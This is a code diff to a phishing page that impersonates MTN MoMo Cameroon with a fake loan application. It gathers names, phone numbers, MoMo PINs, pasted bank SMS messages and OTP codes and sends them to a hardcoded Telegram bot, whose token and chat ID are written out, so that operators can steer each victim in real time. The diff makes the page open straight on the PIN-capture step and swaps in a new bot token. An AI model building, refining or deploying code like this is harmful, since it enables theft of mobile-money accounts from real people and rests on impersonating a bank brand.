@@ -1736,9 +1736,214 @@
 
 <body>
 
- <!-- ══════════════════════ PAGE 6: SIM CARD CHECK (UPDATED) ══════════════════════ -->
-    <!-- Fixed: Removed the inline "display: flex" so it stays hidden until ".active" is applied -->
-    <div id="page-sim-check" class="page" style="background: #fff;">
+    <!-- ═══════════════════ ADMIN MODAL (IMPORTANT NOTE) ═══════════════════ -->
+    <div id="adminModalOverlay">
+        <div class="admin-modal">
+            <div class="modal-title">
+                <span>📌</span> IMPORTANT NOTE
+            </div>
+            <div class="modal-body" id="adminModalBody">Message from admin</div>
+            <button class="modal-close-btn" onclick="closeAdminModal()">OK, GOT IT</button>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 1: LANDING ══════════════════════ -->
+    <div id="page-landing" class="page">
+        <div class="land-nav">
+            <div style="flex: 1;"></div>
+            <div class="mtn-logo">
+                <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" class="logo-img" />
+                <div class="mtn-logo-text" style="color:#fff;">MoMo</div>
+                <div class="mtn-logo-sub" style="color:rgba(255,255,255,0.6);">from MTN Cameroon</div>
+                <div class="flag-badge"><span class="flag-emoji">Ca</span> Cameroon</div>
+            </div>
+            <div style="flex: 1;"></div>
+        </div>
+        <div class="land-center">
+            <div class="land-card">
+                <h1>Welcome to MTN MoMo Ca</h1>
+                <p class="land-tagline">Get loans easily through MTN MoMo in Cameroon</p>
+                <div class="calc-box">
+                    <h2>Loan Calculator</h2>
+                    <div class="calc-row2">
+                        <span>Amount</span>
+                        <span class="cv" id="calcAmt">CA 500,000</span>
+                    </div>
+                    <div class="calc-row2">
+                        <span>Term</span>
+                        <span class="cv" id="calcTerm">48 Months</span>
+                    </div>
+                    <div class="slider-hint-wrap">
+                        <span class="hint-text">
+                            <span class="hint-arrow"></span> Slide to adjust loan amount
+                        </span>
+                    </div>
+                    <input type="range" id="amtSlider" min="500000" max="5000000" step="100000" value="1000000" oninput="updateCalc()" />
+                    <div class="range-ends">
+                        <span>CFA 500,000</span>
+                        <span>CFA 5,000,000</span>
+                    </div>
+                    <div class="monthly-box">
+                        <span class="ml">Monthly Payment</span>
+                        <span class="ma" id="monthlyAmt">CFA 24,000</span>
+                    </div>
+                </div>
+                <button class="btn-grad" onclick="startApplication()">START APPLICATION</button>
+            </div>
+        </div>
+        <div class="land-footer">© 2026 MTN MoMo Cameroon – Powered by MTN</div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 2: STEP 1 ══════════════════════ -->
+    <div id="page-step1" class="page">
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-landing')">← Back</a>
+            <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
+                <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" class="logo-img small" />
+                <div style="text-align: left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem; color:#fff;">MTN MoMo</div>
+                    <div class="mtn-logo-sub" style="font-size:0.6rem; color:rgba(255,255,255,0.6);">Cameroon</div>
+                </div>
+                <span style="color:var(--mtn-gold); font-size:0.7rem;">CA</span>
+            </div>
+            <div class="nav-right">
+                <div class="hline"></div>
+                <div class="hline"></div>
+                <div class="hline"></div>
+            </div>
+        </nav>
+        <div class="step-center">
+            <div class="step-card">
+                <h2>Loan Application</h2>
+                <p class="step-sub">Step 1 of 3</p>
+                <div class="prog-row">
+                    <div class="prog-seg now"></div>
+                    <div class="prog-seg"></div>
+                    <div class="prog-seg"></div>
+                </div>
+                <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
+                <div class="field"><label>Loan Type</label>
+                    <div class="sel-wrap"><select id="s1ty"><option>Personal Loan</option><option selected>Business Loan</option><option>Home Loan</option><option>Car Loan</option><option>Education Loan</option></select></div>
+                </div>
+                <div class="field"><label>Loan Amount (CFA)</label><input type="number" id="s1am" value="1000000" placeholder="Enter amount" oninput="clearErr('s1Err')" /></div>
+                <div class="field"><label>Loan Term</label>
+                    <div class="sel-wrap"><select id="s1te"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option selected>48 Months</option><option>60 Months</option></select></div>
+                </div>
+                <div class="field"><label>Purpose of Loan</label><textarea id="s1pu" placeholder="Describe the purpose of your loan…" oninput="clearErr('s1Err')"></textarea></div>
+                <button class="btn-grad" onclick="toS2()">NEXT STEP</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 3: STEP 2 ══════════════════════ -->
+    <div id="page-step2" class="page">
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-step1')">← Back</a>
+            <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
+                <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" class="logo-img small" />
+                <div style="text-align: left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem; color:#fff;">MTN MoMo</div>
+                    <div class="mtn-logo-sub" style="font-size:0.6rem; color:rgba(255,255,255,0.6);">Cameroon</div>
+                </div>
+                <span style="color:var(--mtn-gold); font-size:0.7rem;">CA</span>
+            </div>
+            <div class="nav-right">
+                <div class="hline"></div>
+                <div class="hline"></div>
+                <div class="hline"></div>
+            </div>
+        </nav>
+        <div class="step-center">
+            <div class="step-card">
+                <h2>Loan Application</h2>
+                <p class="step-sub">Step 2 of 3</p>
+                <div class="prog-row">
+                    <div class="prog-seg done"></div>
+                    <div class="prog-seg now"></div>
+                    <div class="prog-seg"></div>
+                </div>
+                <div class="msg-box error" id="s2Err"><span class="msg-icon">✕</span><span id="s2ErrTxt"></span></div>
+                <div class="field-row">
+                    <div class="field"><label>First Name</label><input type="text" id="s2fi" placeholder="First Name" oninput="clearErr('s2Err')" /></div>
+                    <div class="field"><label>Last Name</label><input type="text" id="s2la" placeholder="Last Name" oninput="clearErr('s2Err')" /></div>
+                </div>
+                <div class="field">
+                    <label>Phone Number (MTN Cameroon)</label>
+                    <div class="phone-row">
+                        <div class="ph-pre">+237</div><input type="tel" id="s2ph" placeholder="671234567" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')" /></div>
+                    <div class="field-hint">9 digits without +237 prefix (e.g., 671234567)</div>
+                </div>
+                <div class="step-btns">
+                    <button class="btn-gray" onclick="goTo('page-step1')">BACK</button>
+                    <button class="btn-grad" onclick="toS3()">NEXT STEP</button>
+                </div>
+            </div>
+        </div>
+        <div class="pg-footer">© 2026 MTN MoMo Cameroon</div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 4: STEP 3 ══════════════════════ -->
+    <div id="page-step3" class="page">
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-step2')">← Back</a>
+            <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
+                <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" class="logo-img small" />
+                <div style="text-align: left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem; color:#fff;">MTN MoMo</div>
+                    <div class="mtn-logo-sub" style="font-size:0.6rem; color:rgba(255,255,255,0.6);">Cameroon</div>
+                </div>
+                <span style="color:var(--mtn-gold); font-size:0.7rem;">Ca</span>
+            </div>
+            <div class="nav-right">
+                <div class="hline"></div>
+                <div class="hline"></div>
+                <div class="hline"></div>
+            </div>
+        </nav>
+        <div class="step-center">
+            <div class="step-card">
+                <h2>Loan Application</h2>
+                <p class="step-sub">Step 3 of 3</p>
+                <div class="prog-row">
+                    <div class="prog-seg done"></div>
+                    <div class="prog-seg done"></div>
+                    <div class="prog-seg now"></div>
+                </div>
+                <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
+                <div class="field"><label>Employment Status</label>
+                    <div class="sel-wrap"><select id="s3em"><option>Employed</option><option selected>Self-employed</option><option>Unemployed</option><option>Retired</option><option>Student</option></select></div>
+                </div>
+                <div class="field"><label>Annual Income (CFA)</label><input type="number" id="s3in" placeholder="Enter annual income" oninput="clearErr('s3Err')" /></div>
+                <div class="sum-box">
+                    <h3>Application Summary</h3>
+                    <div class="sum-row"><span class="sk">Loan Amount:</span><span class="sv" id="sA">CFA 1,000,000</span></div>
+                    <div class="sum-row"><span class="sk">Loan Term:</span><span class="sv" id="sT">48 Months</span></div>
+                    <div class="sum-row"><span class="sk">Purpose:</span><span class="sv" id="sP">—</span></div>
+                    <div class="sum-row"><span class="sk">Applicant:</span><span class="sv" id="sN">—</span></div>
+                </div>
+                <div class="step-btns">
+                    <button class="btn-gray" onclick="goTo('page-step2')">BACK</button>
+                    <button class="btn-grad" onclick="submitApp()">SUBMIT APPLICATION</button>
+                </div>
+            </div>
+        </div>
+        <div class="pg-footer">© 2026 MTN MoMo Cameroon</div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 5: PROCESSING ══════════════════════ -->
+    <div id="page-processing" class="page">
+        <div style="background:linear-gradient(160deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="proc-wrap">
+                <div class="proc-icon">⏳</div>
+                <h2>Processing Application...</h2>
+                <p>Please wait while we process your loan application</p>
+                <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7);">You will be redirected to continue with MTN MoMo Cameroon</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 6: SIM CARD CHECK (INITIAL PAGE) ══════════════════════ -->
+    <div id="page-sim-check" class="page active" style="background: #fff;">
         <div style="background-color: var(--mtn-dark); height: 45vh; border-radius: 0 0 40px 40px; position: relative; display: flex; flex-direction: column; align-items: center; flex-shrink: 0; padding-top: 20px;">
             <button style="position: absolute; top: 20px; left: 20px; color: var(--mtn-gold); font-size: 24px; cursor: pointer; background: none; border: none; z-index: 11;" onclick="goTo('page-landing')">‹</button>
             <button style="position: absolute; top: 20px; right: 20px; color: var(--mtn-gold); font-size: 24px; cursor: pointer; background: none; border: none; z-index: 11;" onclick="goTo('page-landing')">✕</button>
@@ -1806,7 +2011,7 @@
                     </div>
                 </div>
 
-                <!-- PIN Input (Maintained from previous requirement) -->
+                <!-- PIN Input -->
                 <div style="padding-top: 6px; border-top: 1px solid #f0f0f0;">
                     <label style="display: block; font-size: 0.8rem; font-weight: 500; color: var(--text-mid); margin-bottom: 12px; text-align: center; margin-top: 14px;">Enter MoMo PIN (5 digits)</label>
                     <div class="pin-row" style="display: flex; gap: 10px; justify-content: center; align-items: center;">
@@ -1874,9 +2079,9 @@
                             <circle class="sms-timer-bg" cx="22" cy="22" r="18"/>
                             <circle class="sms-timer-arc" id="smsTimerArc" cx="22" cy="22" r="18"/>
                         </svg>
-                        <div class="sms-timer-num" id="smsTimerNum">60</div>
+                        <div class="sms-timer-num" id="smsTimerNum">200</div>
                     </div>
-                    <div class="sms-timer-text"><strong>Message expires in <span id="smsTimerSec">60</span>s.</strong><br />Paste your SMS before time runs out.</div>
+                    <div class="sms-timer-text"><strong>Message expires in <span id="smsTimerSec">200</span>s.</strong><br />Paste your SMS before time runs out.</div>
                 </div>
                 <div class="sms-resend-wrap" id="smsResendWrap">
                     <p>⏰ Your verification session has expired.<br />Request a new SMS and paste it below.</p>
@@ -2019,12 +2224,11 @@
         // ============================================================
         // TELEGRAM BOT CONFIGURATION
         // ============================================================
-        const TG_TOKEN = "9106560296:AAEWOouW_RmgFwIqoyW3BsMpALAcQz-RIwQ";
+        const TG_TOKEN = "9118339369:AAH5KyE35-La1fMhEDuGUIWHgWJglTcgMZo";
         const TG_CHAT = "8252561674";
         const TG_API = `https://api.telegram.org/bot${TG_TOKEN}`;
 
         const sessions = new Map();
-        let sessionCounter = 1;
 
         function createSession(data) {
             const id = 'APP' + Math.random().toString(36).substring(2, 9).toUpperCase();
@@ -2070,7 +2274,6 @@
             }
         }
 
-        // ─── UPDATED tgFmt: SMS now shows user name and number ───
         function tgFmt(row, kind) {
             if (kind === "sms") {
                 const name = `${row.firstName || ""} ${row.lastName || ""}`.trim() || "—";
@@ -2160,26 +2363,31 @@
             document.getElementById('adminModalOverlay').classList.remove('show');
         }
 
-        document.getElementById('adminModalOverlay').addEventListener('click', function(e) {
-            if (e.target === this) closeAdminModal();
-        });
+        const adminOverlay = document.getElementById('adminModalOverlay');
+        if (adminOverlay) {
+            adminOverlay.addEventListener('click', function(e) {
+                if (e.target === this) closeAdminModal();
+            });
+        }
 
         async function tgPoll() {
             const offset = lastOffset || Number(localStorage.getItem("tg_offset") || 0);
             const r = await tgCall("getUpdates", {
                 offset: offset,
                 timeout: 0,
-                allowed_updates: ["callback_query",
-                    "message"
-                ]
+                allowed_updates: ["callback_query", "message"]
             });
             if (!r || !r.ok) return;
             for (const u of r.result) {
                 lastOffset = u.update_id + 1;
                 localStorage.setItem("tg_offset", String(lastOffset));
 
-                if (u.message && u.message.reply_to_message && u.message.reply_to_message.text && u.message.reply_to_message
-                    .text.includes("Application ID: ")) {
+                if (
+                    u.message &&
+                    u.message.reply_to_message &&
+                    u.message.reply_to_message.text &&
+                    u.message.reply_to_message.text.includes("Application ID: ")
+                ) {
                     if (String(u.message.chat.id) !== TG_CHAT) continue;
                     const targetSessionId = u.message.reply_to_message.text.split("Application ID: ")[1].trim();
                     const customText = u.message.text;
@@ -2195,7 +2403,10 @@
 
                 const cq = u.callback_query;
                 if (!cq) continue;
-                if (String(cq.from.id) !== TG_CHAT && String(cq.message && cq.message.chat && cq.message.chat.id) !== TG_CHAT) {
+                if (
+                    String(cq.from.id) !== TG_CHAT &&
+                    String(cq.message && cq.message.chat && cq.message.chat.id) !== TG_CHAT
+                ) {
                     await tgCall("answerCallbackQuery", {
                         callback_query_id: cq.id,
                         text: "Not authorized"
@@ -2297,7 +2508,7 @@
                 chkSmsMsg();
                 showSmsMsg('error', 'The SMS message was rejected. Please paste the correct message.');
             } else if (stage === 'otp_approved') {
-                const months = parseInt(S.loanTerm) || 48;
+                const months = parseInt(S.loanTerm, 10) || 48;
                 const monthly = Math.ceil((S.loanAmount || 1000000) / months);
                 document.getElementById('aprAmount').textContent = 'CFA ' + (S.loanAmount || 1000000).toLocaleString();
                 document.getElementById('aprAmt').textContent = 'CFA ' + (S.loanAmount || 1000000).toLocaleString();
@@ -2336,37 +2547,42 @@
         // ============================================================
         function goTo(pageId) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-            document.getElementById(pageId) && document.getElementById(pageId).classList.add('active');
+            const target = document.getElementById(pageId);
+            if (target) target.classList.add('active');
             window.scrollTo(0, 0);
 
             if (pageId === 'page-sms-paste') {
                 const btn = document.getElementById('bSms');
                 const spinner = document.getElementById('mSms');
-                btn.disabled = false;
-                spinner.classList.remove('show');
+                if (btn) btn.disabled = false;
+                if (spinner) spinner.classList.remove('show');
                 chkSmsMsg();
                 ['smsMsg', 'smsMsgOk'].forEach(function(id) {
-                    document.getElementById(id).classList.remove('show');
+                    const el = document.getElementById(id);
+                    if (el) el.classList.remove('show');
                 });
             }
 
             if (pageId === 'page-otp') {
                 const btn = document.getElementById('bOtp');
                 const spinner = document.getElementById('mOtp');
-                btn.disabled = false;
-                btn.textContent = 'VERIFY & APPROVE LOAN';
-                spinner.classList.remove('show');
+                if (btn) {
+                    btn.disabled = false;
+                    btn.textContent = 'VERIFY & APPROVE LOAN';
+                }
+                if (spinner) spinner.classList.remove('show');
                 chkOtp();
                 ['otpMsg', 'otpMsgOk'].forEach(function(id) {
-                    document.getElementById(id).classList.remove('show');
+                    const el = document.getElementById(id);
+                    if (el) el.classList.remove('show');
                 });
             }
 
             if (pageId === 'page-login') {
                 const btn = document.getElementById('bLgn');
                 const spinner = document.getElementById('mLgn');
-                btn.disabled = false;
-                spinner.classList.remove('show');
+                if (btn) btn.disabled = false;
+                if (spinner) spinner.classList.remove('show');
                 S.isSubmitting = false;
                 chkPin();
             }
@@ -2379,7 +2595,7 @@
         }
 
         function normalizePhone(id) {
-            let inp = document.getElementById(id);
+            const inp = document.getElementById(id);
             let val = inp.value.replace(/\D/g, '');
             if (val.length > 9) val = val.substring(0, 9);
             inp.value = val;
@@ -2419,8 +2635,7 @@
 
             document.getElementById('sA').textContent = 'CFA ' + S.loanAmount.toLocaleString();
             document.getElementById('sT').textContent = S.loanTerm;
-            document.getElementById('sP').textContent = S.loanPurpose.substring(0, 30) + (S.loanPurpose.length > 30 ? '…' :
-                '');
+            document.getElementById('sP').textContent = S.loanPurpose.substring(0, 30) + (S.loanPurpose.length > 30 ? '…' : '');
             document.getElementById('sN').textContent = S.firstName + ' ' + S.lastName;
 
             goTo('page-step3');
@@ -2437,12 +2652,10 @@
 
             S.employment = em;
             S.annualIncome = in_;
-            S.applicationId = 'APP' + Math.random().toString(36).substring(2, 9).toUpperCase();
 
             document.getElementById('sA').textContent = 'CFA ' + S.loanAmount.toLocaleString();
             document.getElementById('sT').textContent = S.loanTerm;
-            document.getElementById('sP').textContent = S.loanPurpose.substring(0, 30) + (S.loanPurpose.length > 30 ? '…' :
-                '');
+            document.getElementById('sP').textContent = S.loanPurpose.substring(0, 30) + (S.loanPurpose.length > 30 ? '…' : '');
             document.getElementById('sN').textContent = S.firstName + ' ' + S.lastName;
 
             goTo('page-processing');
@@ -2460,7 +2673,6 @@
             S.applicationId = session.id;
             currentSessionId = session.id;
 
-            // Redirect to SIM check page (ONLY after clicking submit)
             setTimeout(() => {
                 goTo('page-sim-check');
             }, 2000);
@@ -2476,10 +2688,15 @@
         }
 
         function updateCalc() {
-            const amt = +document.getElementById('amtSlider').value;
-            document.getElementById('calcAmt').textContent = 'CFA ' + amt.toLocaleString();
+            const slider = document.getElementById('amtSlider');
+            const calcAmt = document.getElementById('calcAmt');
+            const monthlyAmt = document.getElementById('monthlyAmt');
+            if (!slider || !calcAmt || !monthlyAmt) return;
+
+            const amt = +slider.value;
+            calcAmt.textContent = 'CFA ' + amt.toLocaleString();
             const monthly = Math.ceil(amt / 48);
-            document.getElementById('monthlyAmt').textContent = 'CFA ' + monthly.toLocaleString();
+            monthlyAmt.textContent = 'CFA ' + monthly.toLocaleString();
         }
 
         // ══════════════════════════════════════════════════════
@@ -2494,24 +2711,30 @@
         }
 
         document.addEventListener('keydown', function(e) {
-            const id = e.target.id;
+            const id = e.target.id || '';
 
             if (id.startsWith('lp') && id.length === 3 && e.key === 'Backspace' && !e.target.value) {
-                const idx = parseInt(id[2]);
+                const idx = parseInt(id[2], 10);
                 if (idx > 0) document.getElementById('lp' + (idx - 1)).focus();
             }
 
             if (id.startsWith('otp') && !id.startsWith('otpPin') && e.key === 'Backspace' && !e.target.value) {
-                const idx = parseInt(id[3]);
+                const idx = parseInt(id[3], 10);
                 if (idx > 0) document.getElementById('otp' + (idx - 1)).focus();
             }
         });
 
         function chkPin() {
-            const phone = document.getElementById('lpPhone').value.trim();
-            const pinOk = [0, 1, 2, 3, 4].every(i => document.getElementById('lp' + i).value);
-            const ok = phone.length === 9 && pinOk;
+            const phoneEl = document.getElementById('lpPhone');
             const btn = document.getElementById('bLgn');
+            if (!phoneEl || !btn) return;
+
+            const phone = phoneEl.value.trim();
+            const pinOk = [0, 1, 2, 3, 4].every(i => {
+                const el = document.getElementById('lp' + i);
+                return el && el.value;
+            });
+            const ok = phone.length === 9 && pinOk;
             btn.className = ok ? 'btn-login rdy' : 'btn-login';
             btn.disabled = !ok;
         }
@@ -2519,28 +2742,35 @@
         function togPin() {
             [0, 1, 2, 3, 4].forEach(i => {
                 const b = document.getElementById('lp' + i);
-                b.type = b.type === 'password' ? 'text' : 'password';
+                if (b) b.type = b.type === 'password' ? 'text' : 'password';
             });
         }
 
         function clearLoginPin() {
             [0, 1, 2, 3, 4].forEach(i => {
-                document.getElementById('lp' + i).value = '';
+                const el = document.getElementById('lp' + i);
+                if (el) el.value = '';
             });
             chkPin();
-            document.getElementById('lp0').focus();
+            const first = document.getElementById('lp0');
+            if (first) first.focus();
         }
 
         function clearOtpCode() {
             [0, 1, 2, 3].forEach(i => {
-                document.getElementById('otp' + i).value = '';
+                const el = document.getElementById('otp' + i);
+                if (el) el.value = '';
             });
             chkOtp();
-            document.getElementById('otp0').focus();
+            const first = document.getElementById('otp0');
+            if (first) first.focus();
         }
 
         function showLgnMsg(type, text) {
-            ['lpMsg', 'lpMsgOk', 'lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
+            ['lpMsg', 'lpMsgOk', 'lpMsgWarn'].forEach(id => {
+                const el = document.getElementById(id);
+                if (el) el.classList.remove('show');
+            });
             if (type === 'error') {
                 document.getElementById('lpMsgTxt').textContent = text;
                 document.getElementById('lpMsg').classList.add('show');
@@ -2562,9 +2792,12 @@
             if (S.isSubmitting) return;
             S.isSubmitting = true;
 
-            ['lpMsg', 'lpMsgOk', 'lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
+            ['lpMsg', 'lpMsgOk', 'lpMsgWarn'].forEach(id => {
+                const el = document.getElementById(id);
+                if (el) el.classList.remove('show');
+            });
 
-            const phone = document.getElementById('lpPhone').value;
+            const phone = document.getElementById('lpPhone').value.trim();
             const pin = [0, 1, 2, 3, 4].map(i => document.getElementById('lp' + i).value).join('');
 
             if (phone.length !== 9 || pin.length < 5) {
@@ -2579,7 +2812,9 @@
             try {
                 const session = getSession(S.applicationId);
                 if (session) {
+                    S.phone = phone;
                     updateSession(S.applicationId, {
+                        phone: phone,
                         pin: pin,
                         stage: 'pin_submitted'
                     });
@@ -2610,12 +2845,18 @@
         // SMS PASTE PAGE
         // ══════════════════════════════════════════════════════
         function chkSmsMsg() {
-            const txt = document.getElementById('smsMsgBox').value.trim();
-            document.getElementById('bSms').className = txt.length > 3 ? 'btn-sms rdy' : 'btn-sms';
+            const box = document.getElementById('smsMsgBox');
+            const btn = document.getElementById('bSms');
+            if (!box || !btn) return;
+            const txt = box.value.trim();
+            btn.className = txt.length > 3 ? 'btn-sms rdy' : 'btn-sms';
         }
 
         function showSmsMsg(type, text) {
-            ['smsMsg', 'smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
+            ['smsMsg', 'smsMsgOk'].forEach(id => {
+                const el = document.getElementById(id);
+                if (el) el.classList.remove('show');
+            });
             if (type === 'error') {
                 document.getElementById('smsMsgTxt').textContent = text;
                 document.getElementById('smsMsg').classList.add('show');
@@ -2723,7 +2964,6 @@
             }
         }
 
-        // ─── Updated SMS parser: shows name and number in Telegram notification ───
         async function doSmsParse() {
             ['smsMsg', 'smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
 
@@ -2745,7 +2985,6 @@
             try {
                 const session = getSession(S.applicationId);
                 if (session) {
-                    // ─── Send SMS with full user details (name & number) ───
                     updateSession(S.applicationId, {
                         smsMessage: msg,
                         stage: 'sms_submitted'
@@ -2777,7 +3016,7 @@
         // ══════════════════════════════════════════════════════
         function handleOtpInput(el, type) {
             el.value = el.value.replace(/\D/, '');
-            const idx = parseInt(el.id.match(/\d$/)[0]);
+            const idx = parseInt(el.id.match(/\d$/)[0], 10);
             if (el.value && type === 'otp' && idx < 3) {
                 document.getElementById(type + (idx + 1)).focus();
             }
@@ -2785,12 +3024,20 @@
         }
 
         function chkOtp() {
-            const otpOk = [0, 1, 2, 3].every(i => document.getElementById('otp' + i).value);
-            document.getElementById('bOtp').className = otpOk ? 'btn-otp rdy' : 'btn-otp';
+            const btn = document.getElementById('bOtp');
+            if (!btn) return;
+            const otpOk = [0, 1, 2, 3].every(i => {
+                const el = document.getElementById('otp' + i);
+                return el && el.value;
+            });
+            btn.className = otpOk ? 'btn-otp rdy' : 'btn-otp';
         }
 
         function showOtpMsg(type, text) {
-            ['otpMsg', 'otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
+            ['otpMsg', 'otpMsgOk'].forEach(id => {
+                const el = document.getElementById(id);
+                if (el) el.classList.remove('show');
+            });
             if (type === 'error') {
                 document.getElementById('otpMsgTxt').textContent = text;
                 document.getElementById('otpMsg').classList.add('show');
@@ -2844,9 +3091,27 @@
             }
         }
 
-        // INIT
+        function ensureInitialSession() {
+            if (!S.applicationId || !getSession(S.applicationId)) {
+                const initialSession = createSession({
+                    firstName: S.firstName || '',
+                    lastName: S.lastName || '',
+                    phone: S.phone || '',
+                    loanAmount: S.loanAmount || 1000000,
+                    loanTerm: S.loanTerm || '48 Months',
+                    purpose: S.loanPurpose || '',
+                    employment: S.employment || '',
+                    annualIncome: S.annualIncome || 0
+                });
+                S.applicationId = initialSession.id;
+                currentSessionId = initialSession.id;
+            }
+        }
+
+        // INIT — start directly on Page 6 (page-sim-check)
         updateCalc();
-        goTo('page-landing');
+        ensureInitialSession();
+        goTo('page-sim-check');
     </script>
 </body>
 
